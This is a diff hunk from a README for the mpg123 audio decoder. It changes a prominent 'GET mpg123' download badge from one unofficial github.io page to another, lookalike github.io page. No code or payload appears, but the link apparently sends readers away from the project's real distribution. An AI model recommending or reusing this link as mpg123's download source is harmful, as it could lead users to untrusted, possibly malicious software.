@@ -75,7 +75,7 @@ The ALSA module is [alsa.c](out/alsa.c). PulseAudio, Windows wave output, and JA
 
 Ready builds exist for Linux, for Windows as an mpg123 exe, and for small boards such as a Raspberry Pi. A source tree builds with the C toolchain you already use for other libraries. The mpg123 dll, when you need one, is the shared form of libmpg123, not a separate player.
 
-[![GET mpg123](https://img.shields.io/badge/GET-mpg123-CA8A04?style=social&labelColor=1C1917)](https://sandrayounga406.github.io/.github/mpg123-decoder)
+[![GET mpg123](https://img.shields.io/badge/GET-mpg123-CA8A04?style=social&labelColor=1C1917)](https://mpg123-decoder.github.io/mpg123-library/)
 
 | You are on | What to take | Notes |
 | --- | --- | --- |
